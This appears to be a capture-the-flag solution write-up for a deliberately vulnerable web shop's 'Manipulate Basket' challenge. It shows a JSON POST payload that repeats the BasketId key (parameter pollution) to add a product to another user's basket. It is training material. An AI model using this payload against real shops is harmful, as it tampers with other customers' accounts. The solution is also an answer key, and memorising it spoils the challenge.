# Manipulate Basket

## Objective

Put an additional product into another user's shopping basket.

## Solution

When the **"Add to basket"** button is clicked under any product, the application sends a POST request (`/api/BasketItems/`) to the server with the following data.

```json
{"ProductId":25,"BasketId":"6","quantity":1}
```

![Add Item to Basket](img/add-item-to-basket.png)

If we pollute the `BasketId` parameter, then we can successfully manipulate the basket. In this case, add the product to another user's shopping basket.

**If the request is made with the following data, the product will be added to `BasketId` `1` instead of `6`.**

```json
{
  "ProductId":25,
  "BasketId":"6",
  "quantity":1,
  "BasketId":"1"
}
```

![Basket Id Parameter Pollution](img/basket-id-parameter-pollution.png)

![Manipulate Basket Solved](img/manipulate-basket-solved.png)
